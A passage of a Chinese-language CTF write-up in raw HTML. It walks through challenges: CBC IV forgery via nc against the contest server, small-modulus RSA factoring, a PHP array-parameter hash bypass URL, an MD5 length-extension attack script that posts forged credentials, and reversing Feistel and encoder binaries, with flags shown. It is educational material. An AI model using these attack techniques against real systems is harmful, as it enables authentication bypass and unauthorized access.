data.decode('hex')</span><br><span class=\"line\">        except Exception, e:</span><br><span class=\"line\">            self.request.send(\"Error: &#123;&#125;\\n\".format(e.message))</span><br><span class=\"line\">            self.request.close()</span><br><span class=\"line\">            return</span><br><span class=\"line\"></span><br><span class=\"line\">        if len(raw_data) &lt; 32 or len(raw_data) &amp; 0xf:</span><br><span class=\"line\">            self.request.send(\"Your input is not valid!\\n\")</span><br><span class=\"line\">            self.request.close()</span><br><span class=\"line\">            return</span><br><span class=\"line\">        </span><br><span class=\"line\">        iv = raw_data[:16]</span><br><span class=\"line\">        enc = raw_data[16:]</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">        plain = cipher.decrypt(enc)</span><br><span class=\"line\">        self.request.send(\"Here is your plaintext: &#123;&#125;\\n\".format(repr(plain)))</span><br><span class=\"line\"></span><br><span class=\"line\">        if plain[:5] == 'admin':</span><br><span class=\"line\">            self.request.send(\"hello, admin! Here is your flag: &#123;&#125;\".format(flag))</span><br><span class=\"line\">        self.request.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == \"__main__\":</span><br><span class=\"line\">    HOST, PORT = \"localhost\", 9999</span><br><span class=\"line\">    server = SocketServer.TCPServer((HOST, PORT), handler)</span><br><span class=\"line\">    server.serve_forever()</span><br></pre></td></tr></table></figure>\n<p>代码里显示<strong>AES.MODE_CBC</strong>，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图</p>\n<p><img src=\"/images/in-post/post-blog-jserv9.png\" alt=\"img\"></p>\n<p>代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。</p>\n<p>这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。</p>\n<p>这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。</p>\n<p><img src=\"/images/in-post/post-blog-jserv4.png\" alt=\"img\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;python</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;'_\\xf7;&gt;\\xca\\xdeQ\\x16\\x96\\xe4y\\xa7\\x92\\xfc\\x9b\\xbd'.encode('hex')</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;'admin\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00'.encode('hex')</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;exit()</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j4\"></p><p></p>\n<h3 id=\"4-babyrsa-100\"><a href=\"#4-babyrsa-100\" class=\"headerlink\" title=\"4.babyrsa 100\"></a>4.babyrsa 100</h3><p>题目提供了一个压缩文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip\" target=\"_blank\" rel=\"noopener\">babyrsa.zip</a>]，包含RAS加密的公钥，密文，现在需要求明文。</p>\n<p>首先从publicKey.pem中提取n，e</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\">pub = RSA.importKey(open(<span class=\"string\">'./publicKey.pem'</span>).read())</span><br><span class=\"line\">n = long(pub.n)</span><br><span class=\"line\">e = long(pub.e)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;n = <span class=\"number\">39845701744153150941069529194757526450699838667585381414738119544695931460213</span></span><br><span class=\"line\">&gt;&gt;e = <span class=\"number\">65537</span></span><br></pre></td></tr></table></figure>\n<p>这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[<a href=\"http://www.factordb.com\" target=\"_blank\" rel=\"noopener\">factordb</a>]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)</p>\n<p><img src=\"/images/in-post/post-blog-j0serv7.png\" alt=\"img\"></p>\n<p>在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。</p>\n<p></p><p id=\"j5\"></p><p></p>\n<h3 id=\"5-Shatter-Sha512-150\"><a href=\"#5-Shatter-Sha512-150\" class=\"headerlink\" title=\"5.Shatter Sha512! 150\"></a>5.Shatter Sha512! 150</h3><p>题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。</p>\n<p><img src=\"/images/in-post/post-blog-jserv5.png\" alt=\"img\"></p>\n<p>题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">202.121.178.201：8083?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>\n<p>不等条件显然成立，这里x与y都成为<strong>Array</strong>类型，hash值都为<strong>Null</strong>，于是echo $flag. </p>\n<p><strong>flag{php_is_best_language_:P}</strong> 被这个漏洞震惊了，果然PHP是最好的语言。</p>\n<p></p><p id=\"j6\"></p><p></p>\n<h3 id=\"6-Penetrate-In-150\"><a href=\"#6-Penetrate-In-150\" class=\"headerlink\" title=\"6.Penetrate In 150\"></a>6.Penetrate In 150</h3><p>（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面</p>\n<p><img src=\"/images/in-post/post-blog-jserv6.png\" alt=\"img\"></p>\n<p>第一次访问会设置一个名为“hmac”的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(“ $secret|$username|$password”)相等。</p>\n<h4 id=\"心路历程：\"><a href=\"#心路历程：\" class=\"headerlink\" title=\"心路历程：\"></a>心路历程：</h4><ol>\n<li>第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是<code>md5(&quot;$secret|admin|admin&quot;)</code>，实际内容为”be9fcfa876db5f4184e1635ce6561de7”。</li>\n<li>第一想法当然是尝试破解\\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得<code>md5(&quot;$secret|admin|admin&quot;)</code>等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。</li>\n<li>然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段<code>payload = {&quot;username&quot;:&quot;admin&quot;,&quot;password[]&quot;:&quot;admin&quot;}</code>，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret|admin|Array，因此放弃了寻找php本身的漏洞。</li>\n<li>第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5(“$secret|admin|xxxxxxx”)，其中xxxxxx为我们可控制的password字段，不能为admin)。</li>\n</ol>\n<h4 id=\"解题思路：\"><a href=\"#解题思路：\" class=\"headerlink\" title=\"解题思路：\"></a>解题思路：</h4><ol>\n<li><p>首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,…,Yn-1)，计算过程为：</p>\n<ol>\n<li><p>$H0=Hmd5(IV, Y0)$</p>\n</li>\n<li><p>$Hi = Hmd5(Hi-1, Yi)$</p>\n</li>\n<li><p>最终有 $md5(Y) = Hn-1$</p>\n<p><em>IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210</em></p>\n<p><em>Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit</em></p>\n</li>\n</ol>\n</li>\n</ol>\n<p><img src=\"/images/in-post/post-blog-jserv10.png\" alt=\"md5\"></p>\n<ol start=\"2\">\n<li><p>然后了解消息填充的具体过程</p>\n<p>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，<strong>并且填充必须进行，即使其位长对512求余的结果等于448</strong>。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。</p>\n<p><a href=\"https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2\" target=\"_blank\" rel=\"noopener\">来自百度百科的例子</a></p>\n</li>\n<li><p>最后，我们分析题目条件，题目给出了<strong>src = md5(\\$secret|admin|admin)</strong>，我们需要构造一个<strong>des = md5(\\$secret|admin|xxxxxx)</strong>，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\\$secret|admin|xxxxxx)的生成过程和md5(\\$secret|admin|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时<strong>des = Hmd5(src, des构造过程中的填充信息)</strong>。</p>\n</li>\n<li><p>python代码实现</p>\n<p>为了实现方便，假设src的构造过程只使用了一个分组，即\\$secret长度小于43，那么des过程中的填充信息就固定为 <code>&#39;\\x80&#39;+&#39;\\x00&#39;*55 +&#39;\\x00\\x02&#39;+&#39;\\x00&#39;*6</code> ，共512bit，64字节，其中’\\x00\\x02’表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则<code>xxxxxx = &quot;admin&quot; + &quot;\\x80&quot; + &quot;\\x00&quot; * (length+12-1) + (length+12的8字节小端表示)</code></p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">bytearr = [&apos;\\x00&apos;,&apos;\\x08&apos;,&apos;\\x10&apos;,&apos;\\x18&apos;,&apos;\\x20&apos;,&apos;\\x28&apos;,&apos;\\x30&apos;,&apos;\\x38&apos;,&apos;\\x40&apos;,&apos;\\x48&apos;,&apos;\\x50&apos;,&apos;\\x58&apos;,&apos;\\x60&apos;,&apos;\\x68&apos;,&apos;\\x70&apos;,&apos;\\x78&apos;,&apos;\\x80&apos;,&apos;\\x88&apos;,&apos;\\x90&apos;,&apos;\\x98&apos;,&apos;\\xa0&apos;,&apos;\\xa8&apos;,&apos;\\xb0&apos;,&apos;\\xb8&apos;,&apos;\\xc0&apos;,&apos;\\xc8&apos;,&apos;\\xd0&apos;,&apos;\\xd8&apos;,&apos;\\xe0&apos;,&apos;\\xe8&apos;,&apos;\\xf0&apos;,&apos;\\xf8&apos;,]</span><br><span class=\"line\">bitarr = [&apos;\\x00&apos;,&apos;\\x01&apos;,&apos;\\x02&apos;, &apos;\\x03&apos;, &apos;\\x06&apos;, &apos;\\x07&apos;, &apos;\\x08&apos;, &apos;\\x09&apos;, &apos;\\x0a&apos;, &apos;\\x0b&apos;]</span><br><span class=\"line\">length = 42</span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\">for length in range(43):</span><br><span class=\"line\">        # say origin len &lt; 43</span><br><span class=\"line\">        origin_len = length + 12</span><br><span class=\"line\">        padding_len = (56 - origin_len)</span><br><span class=\"line\">        padding = &quot;\\x80&quot; + &quot;\\x00&quot; * (padding_len-1)</span><br><span class=\"line\">        checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + &apos;\\x00&apos;*6</span><br><span class=\"line\">        hmac = padding + checksum</span><br><span class=\"line\">        payload = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;: &apos;admin&apos;+padding + checksum&#125;</span><br><span class=\"line\">        cookie = &#123;&apos;hmac&apos;: &quot;5f1b36f358a22a9abe395cba54f6d3bc&quot;&#125;</span><br><span class=\"line\">        r = session.post(&quot;http://202.121.178.201:8081/&quot;, cookies=cookie, data=payload)</span><br><span class=\"line\">        print(r.text)</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j7\"></p><p></p>\n<h3 id=\"7-Eva-200\"><a href=\"#7-Eva-200\" class=\"headerlink\" title=\"7.Eva 200\"></a>7.Eva 200</h3><p>此题出了bug，直接爆出了答案，没有认真做。</p>\n<p>For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}</p>\n<p></p><p id=\"j8\"></p><p></p>\n<h3 id=\"8-babyre-100\"><a href=\"#8-babyre-100\" class=\"headerlink\" title=\"8.babyre 100\"></a>8.babyre 100</h3><p>题目给出一个pyc文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc\" target=\"_blank\" rel=\"noopener\">encrypt.pyc</a>]，使用在线工具反编译一下[<a href=\"http://tools.bugscaner.com/decompyle/\" target=\"_blank\" rel=\"noopener\">decompyle</a>]，得到python源文件，内容如下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5raw</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray(md5(s).digest())</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xor</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(a) == len(b)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray([ i ^ j <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> zip(a, b) ])</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">flag = bytearray(raw_input(<span class=\"string\">'Show me your flag: '</span>))</span><br><span class=\"line\"><span class=\"keyword\">assert</span> len(flag) == <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>] = xor(flag[:<span class=\"number\">16</span>], md5raw(flag[<span class=\"number\">16</span>:]))</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>], flag[<span class=\"number\">16</span>:] = flag[<span class=\"number\">16</span>:], flag[:<span class=\"number\">16</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> flag == <span class=\"string\">'\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1&lt;\\xa9\\\\A\\xde\\xd22\\n'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'Right!'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'Wrong!'</span></span><br></pre></td></tr></table></figure>\n<p>这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。</p>\n<p><img src=\"/images/in-post/post-blog-jserv11.png\" alt=\"img\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5raw</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray(md5(s).digest())  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xor</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(a) == len(b)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray([ i ^ j <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> zip(a, b) ])</span><br><span class=\"line\">flag = bytearray(<span class=\"string\">'\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1&lt;\\xa9\\\\A\\xde\\xd22\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    flag[<span class=\"number\">16</span>:] = xor(flag[<span class=\"number\">16</span>:], md5raw(flag[:<span class=\"number\">16</span>]))</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>], flag[<span class=\"number\">16</span>:] = flag[<span class=\"number\">16</span>:], flag[:<span class=\"number\">16</span>]</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;flag&#123;<span class=\"number\">1</span>nt3re5tiNg_F3iste1_ciPh3R&#125;</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j9\"></p><p></p>\n<h3 id=\"9-encoder-200\"><a href=\"#9-encoder-200\" class=\"headerlink\" title=\"9.encoder 200\"></a>9.encoder 200</h3><p>逆向题目，链接为[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip\" target=\"_blank\" rel=\"noopener\">encoder.zip</a>]，解压后一个名为encoder的可执行文件，一个加密后的flag”KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=”。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。</p>\n<p><img src=\"/images/in-post/post-blog-jserv12.png\" alt=\"img\"></p>\n<p>使用IDA打开encoder进行分析。<code>main</code>函数如下，主要调用了<code>sub_4006D6()</code>这个函数</p>\n<p><img src=\"/images/in-post/post-blog-jserv13.png\" alt=\"img\"></p>\n<p>函数<code>sub_4006D6()</code>内容如下，是主要的加密过程</p>\n<p><img src=\"/images/in-post/post-blog-jserv14.png\" alt=\"img\"></p>\n<p>在函数<code>sub_4006D6()</code>内使用了两个数组（上图红线部分），数组内容如下。注意<code>byte_601080[]</code>第一位为<code>61h</code>是字符a，所以数组内容为<code>&#39;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&#39;</code>，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。</p>\n<p><img src=\"/images/in-post/post-blog-jserv15.png\" alt=\"img\"></p>\n<p>反编译出的c代码的问题是变量名不易于理解，需要先来理解<code>sub_4006D6()</code>的主要过程。main函数中变量<code>s</code>为输入字符串的地址，变量<code>v6</code>为字符串的长度。于是可以得到<code>shb_4006D6()</code>函数中变量<code>a1</code>为字符串起始地址，<code>a2</code>为字符串长度。接下来<code>malloc()</code>函数分配空间，应该是给密文分配空间的，从<code>8*(len/5+1)+1</code>可以看出算法是分组加密，每5个字符加密出8个字符。<code>v7</code>是将输入字符的一个分组取出来，重点在到<code>v9[] = byte_601080[v7 &amp; 0x1F]</code>也就是取<code>v7</code>的后5位去<code>byte_601080[]</code>中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__<span class=\"function\">fastcall <span class=\"title\">sub_4006D6</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> __int64 messagePtr, <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [sp+14h] [bp-2Ch]@4</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> j; <span class=\"comment\">// [sp+14h] [bp-2Ch]@9</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> left_len; <span class=\"comment\">// [sp+18h] [bp-28h]@2</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+1Ch] [bp-24h]@9</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 check_sum; <span class=\"comment\">// [sp+20h] [bp-20h]@2</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 new_message_ptr; <span class=\"comment\">// [sp+28h] [bp-18h]@1</span></span><br><span class=\"line\">  _BYTE *group_secret; <span class=\"comment\">// [sp+30h] [bp-10h]@1</span></span><br><span class=\"line\">  _BYTE *secret; <span class=\"comment\">// [sp+38h] [bp-8h]@1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  secret = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span> * (len / <span class=\"number\">5</span> + <span class=\"number\">1</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\">  new_message_ptr = messagePtr;</span><br><span class=\"line\">  group_secret = secret;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( len + messagePtr &gt; new_message_ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    check_sum = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">    left_len = len + messagePtr - new_message_ptr;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( left_len &gt; <span class=\"number\">5</span> )</span><br><span class=\"line\">      left_len = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      check_sum &lt;&lt;= <span class=\"number\">8</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( i &lt; left_len )</span><br><span class=\"line\">        check_sum |= *(_BYTE *)(i + new_message_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v6 = dword_6010B0[left_len - <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">7</span>; j &gt;= <span class=\"number\">0</span>; --j )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      group_secret[j] = byte_601080[check_sum &amp; <span class=\"number\">0x1F</span>];</span><br><span class=\"line\">      check_sum &gt;&gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 )</span><br><span class=\"line\">      <span class=\"built_in\">memset</span>(&amp;group_secret[<span class=\"number\">8L</span>L - v6], <span class=\"number\">61</span>, v6);</span><br><span class=\"line\">    new_message_ptr += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">    group_secret += <span class=\"number\">8</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *group_secret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> secret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么解密过程就是，对于密文的每8个字符的分组，去<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">def decode(secret):</span><br><span class=\"line\">    table = &apos;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&apos;</span><br><span class=\"line\">    message = [0]*40</span><br><span class=\"line\">    string = [&apos;&apos;]*5</span><br><span class=\"line\"></span><br><span class=\"line\">    for i, ch in enumerate(secret):</span><br><span class=\"line\">        index = table.index(ch)</span><br><span class=\"line\">        print(index)</span><br><span class=\"line\">        start = (8-i)*5-5</span><br><span class=\"line\">        while index!=0:</span><br><span class=\"line\">            message[start] = index % 2</span><br><span class=\"line\">            #print (message,start,index)</span><br><span class=\"line\">            index &gt;&gt;= 1</span><br><span class=\"line\">            start += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        num = 0</span><br><span class=\"line\">        for j in range(i*8+7, i*8-1, -1):</span><br><span class=\"line\">            num &lt;&lt;= 1</span><br><span class=\"line\">            num += message[j]</span><br><span class=\"line\">        string[i] = chr(num)</span><br><span class=\"line\">    print(string)</span><br><span class=\"line\">    return string[::-1]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;&quot;.join(decode(&quot;KNByeN88&quot;)+decode(&quot;KqslM52E&quot;)+decode(&quot;1L67aYRE&quot;)+decode(&quot;K1qQ2N1Q&quot;)+decode(&quot;ydYlaEd&quot;)))</span><br><span class=\"line\"></span><br><span 